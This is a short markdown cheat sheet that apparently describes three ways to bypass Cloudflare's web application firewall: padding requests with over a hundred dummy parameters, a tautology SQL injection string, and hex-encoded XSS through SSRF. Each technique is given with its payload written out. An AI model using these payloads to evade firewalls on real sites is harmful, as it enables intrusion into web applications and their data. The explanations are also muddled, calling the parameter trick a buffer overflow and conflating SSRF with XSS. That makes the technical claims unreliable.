## CloudFlare WAF Bypass w/ Nginx Exploit
a Nginx WAF vulnerability, which effects Cloudflare, is a "buffer overflow" in a sense and a "Firewall Bypass" in a sense. `&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=`
CloudFlare NGINX WAF doesn't support more than 100 parameters which means that will be disregarded when checking URL requests. This can be used to bypass CloudFlare WAF and to bypass forbidden page erros from cloudflare.

## Cloudflare WAF Bypass w/ SQL Injections
`'or 1 = 1 -- -` can bypass CloudFlare's WAF and execute a succesful SQL injection. It does so by bypassing the WAF and going straight into the application. Normally, the request will go through the WAF and then to the webserver while being filtered.
Instead, this set of characters goes through the WAF as a good query and then hits the web server, causing a SQL injection.

## Cloudflare WAF Bypass w/ SSRF
Servers vulnerable to SSRF can execute internal XSS injections, internal SQL injections, expose the web server origin IP, and execute code from the attackers query. If the server executes requests from the server-side such as echo 'big', an attacker could send transform their payload into HEX, then attack the webserver.
> Example: <script>alert('xss');</script> is `\x3c\x73\x63\x72\x69\x70\x74\x3e\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29\x3b\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e` in hex.
> `example.com/send.php?q=\x3c\x73\x63\x72\x69\x70\x74\x3e\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29\x3b\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e` when an SSRF vuln is present, would alert('xss')

